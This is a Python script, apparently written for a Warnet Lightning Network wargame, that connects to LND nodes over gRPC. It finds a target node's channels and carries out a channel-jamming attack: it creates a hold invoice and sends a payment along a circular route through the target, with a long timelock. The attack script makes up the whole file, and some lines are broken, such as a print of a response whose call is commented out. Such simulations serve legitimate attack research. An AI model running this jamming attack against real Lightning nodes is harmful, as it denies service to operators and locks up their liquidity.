#!/usr/bin/python3

import codecs, grpc, os, sys
import invoices_pb2 as invoicesrpc, invoices_pb2_grpc as invoicesstub
import lightning_pb2 as ln
import lightning_pb2_grpc as lnrpc
import router_pb2 as routerrpc, router_pb2_grpc as routerstub


os.environ["GRPC_SSL_CIPHER_SUITES"] = 'HIGH+ECDSA'


def get_node_grpc(node_num: int):
    node_port = os.environ[f'LIGHTNING_{node_num}_SERVICE_PORT']
    node_ip = os.environ[f'LIGHTNING_{node_num}_SERVICE_HOST']
    node_addr = f'lightning-{node_num}.warnet-armada:{node_port}'
    print(node_addr)
    cert = open(f'../credentials/lnd{node_num}-tls.cert', 'rb').read()
    macaroon = open(f'../credentials/lnd{node_num}-admin.macaroon','rb').read()
    macaroon = codecs.encode(macaroon, 'hex')
    # cred = grpc.ssl_channel_credentials(cert)
    chan = grpc.secure_channel(node_addr, grpc.ssl_channel_credentials(cert))
    metadata = [('macaroon', macaroon)]
    return lnrpc.LightningStub(chan), invoicesstub.InvoicesStub(chan), routerstub.RouterStub(chan), metadata


ln0, in0, rt0, md0 = get_node_grpc(0)
ln1, in1, rt1, md1 = get_node_grpc(1)
ln2, in2, rt2, md2 = get_node_grpc(2)
target_pubkey = '025548fb1a3479540bb51e69807b134f3fc7a0d9aa91e3ba027ab4c8e1f68fa5e6'
ln0_pubkey = '03185391b0bed2b842068df8bdd5aac3457409efd6ae8fe5217c51e0dcbea0e834'
ln1_pubkey = '0276e18c99ba53eb8e5fc0e10de75d31d53cadfb20936dcdc93e3eefeb30ca0361'
node3_pubkey = '0328be947ef1b65d882309187474e5a9fe2c8f3c8f204d1a8c85ab21c50c8d6f55'
node5_pubkey = '031cc7a8ee8dbddbf8f35cc4d824c6ae9b861260bc836738e1fffe9e28d652368c'


graph = ln0.DescribeGraph(ln.ChannelGraphRequest(), metadata=md0)
# print(dir(graph))
target_channels = []
for chan in graph.edges:
    if target_pubkey in [chan.node1_pub, chan.node2_pub]:
        # print(chan)
        target_channels.append(chan.channel_id)

print(target_channels)

new_chan = ln.OpenChannelRequest(node_pubkey=b'{target_pubkey}',
                                 local_funding_amount=10000000,
                                 push_sat=5000000)

# resp = ln0.OpenChannel(new_chan, metadata=md0)
#resp = ln1.OpenChannel(new_chan, metadata=md1)
print('open channel:', resp)

import random
#request = invoicesrpc.AddHoldInvoiceRequest(hash=b'00000000000000000000000000000001')
payment_hash = random.randbytes(32)
request = invoicesrpc.AddHoldInvoiceRequest(hash=payment_hash)
resp = in1.AddHoldInvoice(request, metadata=md1)
bolt11 = resp.payment_request
print(bolt11)

jamming_route = []
jamming_route.append(bytes.fromhex(target_pubkey))
jamming_route.append(bytes.fromhex(node3_pubkey))
jamming_route.append(bytes.fromhex(node5_pubkey))
jamming_route.append(bytes.fromhex(target_pubkey))
jamming_route.append(bytes.fromhex(ln1_pubkey))
print(jamming_route)
route_request = routerrpc.BuildRouteRequest(
                                            amt_msat=1000,
                                            final_cltv_delta=1008,
                                            hop_pubkeys = jamming_route)
route = rt0.BuildRoute(route_request, metadata=md0)
print(route)
send_to_route_request = routerrpc.SendToRouteRequest(payment_hash=payment_hash, route=route.route)
send = rt0.SendToRouteV2(send_to_route_request, metadata=md0)
print(send)

print("success")
